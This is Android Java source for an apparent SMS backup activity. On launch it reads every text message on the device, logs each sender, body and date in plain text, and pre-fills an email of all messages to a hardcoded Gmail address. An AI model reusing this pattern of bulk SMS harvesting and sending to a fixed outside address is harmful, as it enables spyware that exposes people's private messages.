package com.rv.ui;

import java.text.SimpleDateFormat;
import java.util.Date;
import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class BackupIt extends Activity {
	/** Called when the activity is first created. */
	public String[] SMS_ADDRESS;
	public String SMS_SUBJECT = "BackUp";
	public String[] SMS_BODY;
	public String[] SMS_DATE;
	public String MAIN_BODY = "";
	
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		int count = 0; 
		int columnCount = 0;
		Uri uri = Uri.parse("content://sms");
		String[] projection = { "_id", "thread_id", "address", "person", "date", "body" };
		Date tempdate;
		
		/*ContentValues sms = new ContentValues();
		sms.put("_id", "111");
		sms.put("thread_id", "12");
		sms.put("address", "+919689152909");
		sms.put("date", System.currentTimeMillis());
		sms.put("body", "Fake");
		getContentResolver().insert(uri, sms);*/
		
		Cursor cursor = getContentResolver().query(uri, projection , null, null, null); 
		if(cursor != null){
			Log.e("Cursor", "Value : " + cursor.getCount());
			count = cursor.getCount();
			columnCount = cursor.getColumnCount();
			SMS_ADDRESS = new String[count];
			SMS_BODY = new String[count];
			SMS_DATE = new String[count]; 
			
			for(int i = 0; i < count; i++){
				cursor.moveToPosition(i);
				//for(int j = 0; j < columnCount; j++){
				//Contact Name / Number
				SMS_ADDRESS[i] = cursor.getString(cursor.getColumnIndex(cursor.getColumnName(2)));
				//SMS body
				SMS_BODY[i] = cursor.getString(cursor.getColumnIndex(cursor.getColumnName(5)));
				//SMS Date
				SMS_DATE[i] = cursor.getString(cursor.getColumnIndex(cursor.getColumnName(4)));
				tempdate = new Date(Long.parseLong(SMS_DATE[i]));
				SMS_DATE[i] = getCovertedDate(tempdate);
				
				MAIN_BODY = MAIN_BODY + SMS_ADDRESS[i] + " - " +  SMS_BODY[i] + "\n\n";

				Log.e("SMS_ADDRESS" , "SMS_ADDRESS value : " + SMS_ADDRESS[i]);
				Log.e("SMS_BODY" , "SMS_BODY value : " + SMS_BODY[i]);
				Log.e("SMS_DATE" , "SMS_DATE value : " + SMS_DATE[i]);
				//}
				Log.e("=================================", "=====================================================");
			}
			Log.e("MAIN_BODY" , "MAIN_BODY value : " + MAIN_BODY);
			Intent i = new Intent(Intent.ACTION_SEND);
			i.setType("text/plain");
			i.putExtra(Intent.EXTRA_EMAIL , new String[]{"nontechbkn@gmail.com"}); 
			i.putExtra(Intent.EXTRA_SUBJECT, SMS_SUBJECT); 
			i.putExtra(Intent.EXTRA_TEXT, MAIN_BODY); 
			startActivity(Intent.createChooser(i, "Send mail")); 

		}else{
			Log.e("Cursor is NULL", " No contacts Available");
		}
	}
	
	public static String getCovertedDate(Date date){
		StringBuilder endDate = new StringBuilder();
		//Create the current date
		SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd'T'hh:mm:ss:aa");
		endDate.append(simpleDateFormat.format(date));
		endDate.delete(endDate.length() - 3, endDate.length());
		endDate.append(".00");

		return endDate.toString();
	}

}
